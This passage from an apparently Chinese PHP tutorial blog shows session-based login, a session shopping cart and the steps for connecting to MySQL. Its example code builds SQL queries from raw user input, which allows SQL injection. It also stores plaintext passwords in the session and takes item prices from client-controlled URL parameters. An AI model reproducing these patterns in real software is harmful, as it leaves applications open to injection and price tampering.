spellcheck="true">//从db获取用户信息   数据库信息改成自己的</span>   <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"select * from user where `username` =  '$username' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//密码验证通过，设置session，把用户名和密码保存在服务端</span>       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//最后跳转到登录后的欢迎页面 //注意：这里我们没有像cookie一样带参数过去</span>       <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: welcome.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- 这里指明页面编码 --></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>           用户名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>           密  码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>               <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br>welcome.php 这里我们用的是session中的信息,而不是像cookie一样在url中带参数过来</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>   welcome<span class="token punctuation">,</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="5-2-购物车例子"><font color="#3CB371" face="Comic sans MS">5.2 购物车例子</font><a href="post/PHP-SessionManagement#5-2-购物车例子"></a></h4><blockquote><p><strong>3个文件：</strong></p><ol><li><font color="#FF7F00">goodsList.php</font> 这个是商品展示页，还有功能：如果是第一次购买某物品，则在购物车中加入该商品信息和计算总价，如果再次点击购买，则已购商品数量加1，总价重新计算，查看购物车链接可以到购物车页面。</li><li><font color="#FF7F00">buy.php</font> 此页完成购买功能，然后再次跳转到商品列表。主要是做了在session中处理购买商品操作。</li><li><font color="#FF7F00">shoppingCart.php</font> 此页展示购物车中的商品、价格、总价等信息。</li></ol></blockquote><p>&emsp;<br><strong>首先建立数据库信息：</strong><br>建立名为test的数据库，库中有个shop表，表结构有3个字段：<br>id  int(10)<br>name  varchar(20)<br>price  varchar(20)</p><p>&emsp;<br>goodsList.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$goods</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//从数据库获取商品信息存入$goods二维数组</span>   <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//这里请换上自己的数据库相关信息</span>   <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">'select * from shop'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//这里把商品信息放到$goods二维数组，每一维存的是单个</span>   <span class="token comment" spellcheck="true">//商品的信息，比如商品名、价格。</span>   <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>   <span class="token delimiter">&lt;?php</span>   <span class="token comment" spellcheck="true">//取出商品信息显示在页面上，并添加购买功能</span>       <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$goods</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">echo</span> <span class="token string">' 商品名 '</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">' 价格 '</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token keyword">echo</span> <span class="token string">"&lt;a href=buy.php?name="</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'&amp;price='</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">">购买&lt;/a>"</span><span class="token punctuation">;</span>           <span class="token keyword">echo</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>   <span class="token delimiter">?></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>shoppingCart.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>查看购物车<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>buy.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>   <span class="token comment" spellcheck="true">//开启session</span>   <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//获取传过来的商品名和价格</span>   <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$price</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//把session中的商品信息和传过来的(刚买的)商品信息对比</span>   <span class="token variable">$goods</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'goods'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">==</span> <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//买过的话，则总价格增加，相应商品数量增加</span>       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'totalPrice'</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token variable">$price</span><span class="token punctuation">;</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//第一次买的话，将相应的商品信息添加到session中</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$price</span><span class="token punctuation">;</span>       <span class="token variable">$goods</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'totalPrice'</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token variable">$price</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'goods'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$goods</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//购买处理完毕后跳转到商品列表</span>   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location: goodsList.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>shoppingCart.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将session中的商品信息(即购物车中的商品)和总价显示到页面</span><span class="token variable">$goods</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'goods'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'您买了:&lt;br />'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$goods</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">' 价格 '</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">' 数量 '</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'总价：'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'totalPrice'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>goodsList.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>返回商品列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>效果图如下：</p><div class="article-img"><p><img src="https://i.loli.net/2019/02/26/5c7522ea3d61f.png" alt="1" data-zoomable></p></div>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP操作MySQL数据库</title>
      <link href="/post/PHP-MySQL/"/>
      <url>/post/PHP-MySQL/</url>
      
        <content type="html"><![CDATA[<p>😁</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP操作MySQL数据库</font></center><p>&emsp;<br>&emsp;</p><h3 id="一-数据库连接步骤"><font color="#FF6347" face="Comic sans MS">一. 数据库连接步骤</font><a href="post/PHP-MySQL#一-数据库连接步骤"></a></h3><p>将数据库连接整理成了最重要的<font color="#FF7F00"><strong>8个步骤</strong></font>，我戏称它为：“数据库连接天龙八步”。😊  (。・∀・)ノ</p><p>&emsp;</p><h4 id="第一步-连接数据库服务器"><font color="#3CB371" face="Comic sans MS">第一步:  连接数据库服务器</font><a href="post/PHP-MySQL#第一步-连接数据库服务器"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_connect.asp" target="_blank" rel="noopener">PHP mysql_connect() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_connect()</td></tr><tr><td align="center">函数原型</td><td align="left">mysql_connect(server,user,pwd,newlink,clientflag)</td></tr><tr><td align="center">功能</td><td align="left">连接到mysql数据库服务器</td></tr><tr><td align="center">返回值</td><td align="left">如果成功，则返回一个 MySQL 连接标识，失败则返回 FALSE。</td></tr><tr><td align="center">参数1</td><td align="left">主机</td></tr><tr><td align="center">参数2</td><td align="left">数据库服务器登陆名</td></tr><tr><td align="center">参数3</td><td align="left">密码</td></tr><tr><td align="center">参数4</td><td align="left">数据库的名称</td></tr><tr><td align="center">参数5</td><td align="left">数据库服务器端口不填默认3306</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>对于参数4，数据库名称在此步已填并择，不需要执行第三步。</strong></font></p></blockquote><p>&emsp;</p><h4 id="第二步-判断错误"><font color="#3CB371" face="Comic sans MS">第二步:  判断错误</font><a href="post/PHP-MySQL#第二步-判断错误"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_errno.asp" target="_blank" rel="noopener">PHP mysqli_errno() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_errno(connection)</td></tr><tr><td align="center">功能/返回值</td><td align="left">返回连接错误号，无错误返回0</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect()返回的资源可选。规定 SQL 连接标识符。如果未规定，则使用上一个<br>打开的连接。</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#FF7F00"><strong>如果mysqli_errno()函数返回错误号，则用mysqli_error()显示文本错误信息。</strong></font>&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_error.asp" target="_blank" rel="noopener">PHP mysql_error() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_error(connection)</td></tr><tr><td align="center">功能/返回值</td><td align="left">返回连接错误字符串，如果没有出错则返回 ‘’（空字符串）</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="第三步-选择数据库"><font color="#3CB371" face="Comic sans MS">第三步:  选择数据库</font><a href="post/PHP-MySQL#第三步-选择数据库"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_select_db.asp" target="_blank" rel="noopener">PHP mysqli_select_db() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysql_selecti_db(connection,database)</td></tr><tr><td align="center">返回值</td><td align="left">如果成功，则该函数返回 true。如果失败，则返回 false。</td></tr><tr><td align="center">功能</td><td align="left">选择本连接中的<strong>数据库</strong></td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr><tr><td align="center">参数2</td><td align="left">需要连接的数据库名</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>若在第一步已填数据库，不需要更换成其他数据库，则不需要执行第三步。</strong></font></p></blockquote><p>&emsp;</p><h4 id="第四步-设置字符集"><font color="#3CB371" face="Comic sans MS">第四步:  设置字符集</font><a href="post/PHP-MySQL#第四步-设置字符集"></a></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-mysqli-set-charset.html" target="_blank" rel="noopener">PHP mysqli_set_charset 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_set_charset(connection,charset)</td></tr><tr><td align="center">功能</td><td align="left">设置与mysql服力器连接，结果，校验字符集</td></tr><tr><td align="center">返回值</td><td align="left">无返回值</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr><tr><td align="center">参数2</td><td align="left">字符集类型</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="第五步-准备SQL语句"><font color="#3CB371" face="Comic sans MS">第五步:  准备SQL语句</font><a href="post/PHP-MySQL#第五步-准备SQL语句"></a></h4><p><font color="#FF7F00"><strong>其实就是一个SQL语句的字符串，用于对MySQL数据库的操作。这一步很重要！</strong></font> </p><p>&emsp;<br>例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into user(username,password) values('$username','$password')"</span><span class="token punctuation">;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"peter"</span><span class="token punctuation">,</span><span class="token string">"abc123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// some code</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li>我们通常要把变量赋值在SQL语句中使用。可是变量或者SQL语句出错了，非常不好排查。</li><li>我们根据实际工作经验增加了这一步。</li><li>如果在执行此步的时候报错了，我们可以把SQL语句打印出来，粘贴到phpMyAdmin或者相关工具中。</li><li>排错时，如果执行成功就说明不是SQL语句的问题。如果执行失败，请仔细检查SQL语句。</li></ol></blockquote><p>&emsp;</p><h4 id="第六步-发送SQL语句"><font color="#3CB371" face="Comic sans MS">第六步:  发送SQL语句</font><a 